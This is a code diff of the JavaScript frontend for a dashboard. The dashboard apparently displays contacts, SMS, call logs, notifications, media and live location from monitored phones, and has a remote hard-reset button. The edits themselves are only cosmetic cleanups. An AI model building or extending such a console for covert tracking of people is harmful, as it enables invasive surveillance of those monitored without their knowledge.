@@ -1,4 +1,4 @@
-// main.js - frontend logic
+// public/main.js
 const api = {
   post: async (path, body, token) => {
     const res = await fetch(path, {
@@ -23,7 +23,7 @@ function setLoggedIn(user, token) {
   document.getElementById('loginBox').classList.add('hidden');
   document.getElementById('userBox').classList.remove('hidden');
   document.getElementById('userName').innerText = user.username;
-  showPanel('devices'); // default
+  showPanel('devices');
   refreshAll();
 }
 function logout() {
@@ -34,7 +34,6 @@ function logout() {
 function getToken() { return localStorage.getItem(tokenKey); }
 function getUser() { return JSON.parse(localStorage.getItem(userKey) || 'null'); }
 
-// login/register wiring
 document.getElementById('btnLogin').addEventListener('click', async () => {
   const u = document.getElementById('username').value;
   const p = document.getElementById('password').value;
@@ -50,15 +49,12 @@ document.getElementById('btnRegister').addEventListener('click', async () => {
 });
 document.getElementById('btnLogout').addEventListener('click', logout);
 
-// menu
 document.querySelectorAll('.menu-btn').forEach(b=> b.addEventListener('click', () => {
   const t = b.getAttribute('data-target');
   showPanel(t);
 }));
 
-function hideAllPanels() {
-  document.querySelectorAll('.panel').forEach(p=> p.classList.add('hidden'));
-}
+function hideAllPanels() { document.querySelectorAll('.panel').forEach(p=> p.classList.add('hidden')); }
 function showPanel(name) {
   hideAllPanels();
   const mapId = {
@@ -74,7 +70,6 @@ function showPanel(name) {
   if (mapId) document.getElementById(mapId).classList.remove('hidden');
 }
 
-// RENDER FUNCTIONS
 async function renderContacts() {
   const token = getToken();
   const q = document.getElementById('contactsQuery').value || '';
@@ -171,6 +166,7 @@ async function renderDevices() {
     left.innerHTML = `<strong>${escapeHtml(d.label||d.deviceId)}</strong><div style="color:#666">${d.lastSeen?new Date(d.lastSeen).toLocaleString():'never'}</div>`;
     const right = document.createElement('div');
     const dot = document.createElement('span'); dot.textContent='●'; dot.style.color = (d.lastSeen && (Date.now() - new Date(d.lastSeen).getTime()) < 120000) ? 'green' : 'red';
+    dot.style.marginRight = '8px';
     right.appendChild(dot);
     const hr = document.createElement('button'); hr.textContent='Hard Reset'; hr.onclick = async () => {
       if (!confirm('Confirm hard reset?')) return;
@@ -190,7 +186,7 @@ async function renderDevices() {
   });
 }
 
-// MAP (Leaflet) - history + realtime polling
+// MAP
 let map, markersLayer;
 function initMap() {
   if (map) return;
@@ -215,22 +211,18 @@ async function renderMap() {
   if (first) map.setView([first.lat, first.lon], 12);
 }
 
-// refresh all panels
+// refresh all
 async function refreshAll() {
   await Promise.all([
     renderContacts(), renderSms(), renderCalls(), renderNotifs(),
     renderUsage(), renderMedia(), renderDevices(), renderMap()
   ]);
 }
-
-// auto-refresh loop (5s)
-setInterval(() => {
-  if (getToken()) refreshAll();
-}, 5000);
+setInterval(() => { if (getToken()) refreshAll(); }, 5000);
 
 document.getElementById('btnReloadMap').addEventListener('click', renderMap);
 
-// init on load if logged in
+// init on load
 window.addEventListener('load', () => {
   const token = getToken();
   if (token) {
@@ -245,4 +237,4 @@ window.addEventListener('load', () => {
 function escapeHtml(s) {
   if (!s) return '';
   return s.toString().replace(/[&<>"']/g, (m)=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
-    }
+}
